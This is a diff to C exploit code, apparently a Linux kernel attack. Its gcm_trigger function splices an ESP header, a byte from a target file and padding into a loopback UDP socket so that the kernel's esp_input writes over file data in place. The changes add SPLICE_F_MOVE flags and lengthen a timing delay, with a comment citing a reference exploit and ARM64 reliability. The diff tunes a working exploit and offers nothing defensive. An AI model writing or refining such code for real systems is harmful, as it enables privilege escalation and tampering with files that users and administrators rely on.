@@ -321,21 +321,22 @@ static bool gcm_trigger(const char *target_path, off_t target_off,
 
     /* esp_hdr (16) || target_byte (1) || icv_pad (16) — 33 bytes total. */
     loff_t off;
-    off = 0;       if (splice(afd2, &off, p[1], NULL, 16, 0) != 16) goto trig_fail;
-    off = target_off; if (splice(tfd,  &off, p[1], NULL, 1, 0) != 1) goto trig_fail;
-    off = 4096;    if (splice(afd2, &off, p[1], NULL, 16, 0) != 16) goto trig_fail;
+    off = 0;       if (splice(afd2, &off, p[1], NULL, 16, SPLICE_F_MOVE) != 16) goto trig_fail;
+    off = target_off; if (splice(tfd,  &off, p[1], NULL, 1,  SPLICE_F_MOVE) != 1)  goto trig_fail;
+    off = 4096;    if (splice(afd2, &off, p[1], NULL, 16, SPLICE_F_MOVE) != 16) goto trig_fail;
 
     int ss = socket(AF_INET, SOCK_DGRAM, 0);
     if (ss < 0) goto trig_fail;
     if (connect(ss, (struct sockaddr *)&la, sizeof(la)) < 0) { close(ss); goto trig_fail; }
-    ssize_t sent = splice(p[0], NULL, ss, NULL, 16 + 1 + 16, 0);
+    ssize_t sent = splice(p[0], NULL, ss, NULL, 16 + 1 + 16, SPLICE_F_MOVE);
     (void)sent;
     close(ss);
     close(p[0]); close(p[1]);
 
-    /* Drive recv (esp_input fires synchronously in the loopback path,
-     * but receiving makes the kernel run through it deterministically). */
-    usleep(50000);
+    /* Wait for esp_input to finish the in-place STORE before we
+     * tear down sockets. 150ms matches V4bel's reference; 50ms was
+     * working on x86 lab kernels but tight on ARM64 / loaded VMs. */
+    usleep(150 * 1000);
     unsigned char drain[256];
     (void)recv(rs, drain, sizeof(drain), MSG_DONTWAIT);
 
